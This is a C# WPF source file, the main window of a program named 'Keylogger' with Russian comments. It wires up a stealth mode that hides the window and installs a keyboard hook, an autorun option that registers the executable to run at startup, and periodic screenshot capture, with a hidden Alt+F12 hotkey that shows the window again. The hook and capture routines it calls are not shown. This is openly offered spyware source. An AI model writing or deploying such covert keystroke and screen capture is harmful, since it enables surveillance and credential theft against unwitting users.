using System;
using System.Windows;
using System.Windows.Controls;
using System.Runtime.InteropServices;
using System.Windows.Interop;
using System.Windows.Threading;



namespace Keylogger
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        #region WinAPI
        //[DllImport("user32.dll")]
        //private static extern IntPtr FindWindow(string sClassName, string sAppName );

        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModiefier, uint vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        #endregion

        DispatcherTimer timer = new DispatcherTimer();
        Keylog keylog = new Keylog();


        public MainWindow()
        {
            InitializeComponent();

            txtNum.Text = _numValue.ToString();

            timer.Tick += new EventHandler(timer_tick);
            timer.Interval = new TimeSpan(0,0,1);
            timer.Start();
            

        }
        
        #region HotKey
        private const int HOTKEY_ID = 9000;
        private IntPtr _windowHandle;
        private HwndSource _source;

        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);

            _windowHandle = new WindowInteropHelper(this).Handle;
            _source = HwndSource.FromHwnd(_windowHandle);
            _source.AddHook(HwndHook);
            

            RegisterHotKey(_windowHandle, HOTKEY_ID, (uint)WindowsHotKey.Alt, (uint)WindowsHotKey.F12); //Alt + F12
        }
        //(uint)WindowsHotKey.Alt
        private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            //HookDemoHelper hookDemoHelper = new HookDemoHelper();
            
            const int WM_HOTKEY = 0x0312;
            switch (msg)
            {
               
                case WM_HOTKEY:
                    switch (wParam.ToInt32())
                    {
                        case HOTKEY_ID:
                           
                            int vkey = (((int)lParam >> 16) & 0xFFFF);
                            if (vkey == (uint)WindowsHotKey.F12 )
                            {
                                Application.Current.MainWindow.Visibility = Visibility.Visible;
                            }
                            handled = true;
                            break;
                    }
                    break;
            }
            return IntPtr.Zero;
        }

        protected override void OnClosed(EventArgs e)
        {
            _source.RemoveHook(HwndHook);
            UnregisterHotKey(_windowHandle, HOTKEY_ID);
            base.OnClosed(e);
        }

        #endregion
        
        #region Timer

        private int time = 0;
        private void timer_tick(object sender, EventArgs e)
        {
            time++;
            labeltime.Content = time.ToString();
            
            if (_numValue >= 1)
            {
                //MessageBox.Show(" ScreenShot Time ");
                if (_numValue * 60 == time)
                {
                    time = 0;
                    string str = DateTime.Now.ToString().Replace(':', '_');
                    ScreenShot.ScreenSave(str);

                }
            }
            else
            {
                time = 0;
            }
        }

        private int _numValue = 0;

        public int NumValue
        {
            get { return _numValue; }
            set
            {
                _numValue = value;
                txtNum.Text = value.ToString();
            }
        }

        

        private void cmdUp_Click(object sender, RoutedEventArgs e)
        {
            NumValue++;
            if (NumValue >= 60) NumValue = 60;
        }

        private void cmdDown_Click(object sender, RoutedEventArgs e)
        {
           NumValue--;
           if (NumValue <=0) NumValue = 0;
        }

        private void txtNum_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (txtNum == null)
            {
                return;
            }

            if (!int.TryParse(txtNum.Text, out _numValue))
                txtNum.Text = _numValue.ToString();
        }


        #endregion

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            CheckAuto.IsChecked = Properties.Settings.Default.AutoRunProp;
            CheckStealth.IsChecked = Properties.Settings.Default.StealthProp;
            txtNum.Text = Properties.Settings.Default.txtNumTimerProp;

            //IntPtr thisWindow = FindWindow(null, "MainWindow");
            //RegistryHotKey(thisWindow, 1, (uint)WindowsHotKey.Ctrl , (uint)Key.V);
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            Properties.Settings.Default.AutoRunProp = (CheckAuto.IsChecked == true);
            Properties.Settings.Default.StealthProp = (CheckStealth.IsChecked == true);
            Properties.Settings.Default.txtNumTimerProp = txtNum.Text;
            Properties.Settings.Default.Save();
        }


         

     private void AutoRun_Check(object sender, RoutedEventArgs e)
     {
         AutoRun.SetAutoRun(true, AutoRun.Path() + "Keylogger.exe"); 
     }

     private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
     {
         AutoRun.SetAutoRun(false, AutoRun.Path() + "Keylogger.exe");
     }


     private void Stealth_Checked(object sender, RoutedEventArgs e)
        {
            Application.Current.MainWindow.Visibility = Visibility.Hidden;
            keylog.SetHook();
        }

     private void Stealth_Unchecked(object sender, RoutedEventArgs e)
        {
            Application.Current.MainWindow.Visibility = Visibility.Visible;
            keylog.Unhook();
        }

        private void tblock_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        
    }
}
